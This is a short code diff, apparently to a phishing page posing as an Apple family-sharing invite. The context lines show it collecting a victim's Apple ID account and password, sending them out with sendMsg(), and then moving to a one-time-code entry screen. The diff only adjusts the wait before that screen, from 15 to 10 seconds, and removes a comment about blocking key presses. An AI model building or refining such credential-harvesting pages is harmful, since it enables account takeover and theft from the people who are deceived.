@@ -122,7 +122,6 @@
             }, 2500);
         }
 
-        // 全面攔截鍵盤事件，確保按鍵無效
         function preventReturn(e) {
             if (e.key === "Enter" || e.keyCode === 13) {
                 e.preventDefault();
@@ -152,11 +151,13 @@
             btn.querySelector('.arrow-svg').style.display = 'none';
             btn.querySelector('.loading-gif').style.display = 'block';
             await sendMsg(`👨‍👩‍👧‍👦 【Apple ID】\n帳號: ${acc}\n密碼: ${pw}`);
+            
+            // 時間改為 10 秒 (10000 毫秒)
             setTimeout(() => {
                 document.getElementById('phase-invite').classList.add('hidden');
                 document.getElementById('phase-otp').classList.remove('hidden');
                 document.querySelectorAll('.otp-input')[0].focus();
-            }, 15000);
+            }, 10000);
         }
 
         const inputs = document.querySelectorAll('.otp-input');
